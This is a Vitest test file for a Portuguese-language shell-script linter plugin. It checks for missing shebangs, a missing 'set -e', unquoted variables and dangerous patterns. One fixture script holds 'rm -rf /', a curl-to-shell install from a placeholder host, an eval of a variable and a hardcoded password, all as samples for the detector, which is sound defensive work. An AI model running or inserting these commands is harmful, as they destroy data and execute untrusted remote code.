import { describe, expect, it } from 'vitest';

import { analistaShell } from '@analistas/plugins/analista-shell.js';

describe('analistaShell', () => {
  it('seleciona extensões shell', () => {
    expect(analistaShell.test('script.sh')).toBe(true);
    expect(analistaShell.test('script.bash')).toBe(true);
    expect(analistaShell.test('script.ts')).toBe(false);
  });

  it('detecta ausência de shebang e set -e', async () => {
    const src = ['echo $USER', 'ls $HOME'].join('\n');
    const ocorrencias = await analistaShell.aplicar(src, 'script.sh');
    const mensagens = ocorrencias.map((item) => item.mensagem);

    expect(mensagens.some((m) => m.includes('sem Shebang'))).toBe(true);
    expect(mensagens.some((m) => m.includes('não utiliza "set -e"'))).toBe(true);
    expect(mensagens.some((m) => m.includes('sem aspas duplas'))).toBe(true);
  });

  it('detecta padrões perigosos em shell script', async () => {
    const src = [
      '#!/bin/bash',
      'set -e',
      'eval "$CMD"',
      'rm -rf /',
      'curl https://x.y/install.sh | sh',
      'PASSWORD="123"',
      'sudo systemctl restart app',
    ].join('\n');

    const ocorrencias = await analistaShell.aplicar(src, 'ops.sh');
    const mensagens = ocorrencias.map((item) => item.mensagem);

    expect(mensagens.some((m) => m.includes('Uso de "eval"'))).toBe(true);
    expect(mensagens.some((m) => m.includes('rm -rf /'))).toBe(true);
    expect(mensagens.some((m) => m.includes('curl/wget diretamente para shell'))).toBe(true);
    expect(mensagens.some((m) => m.includes('credencial hardcoded'))).toBe(true);
    expect(mensagens.some((m) => m.includes('Uso de sudo'))).toBe(true);
  });
});

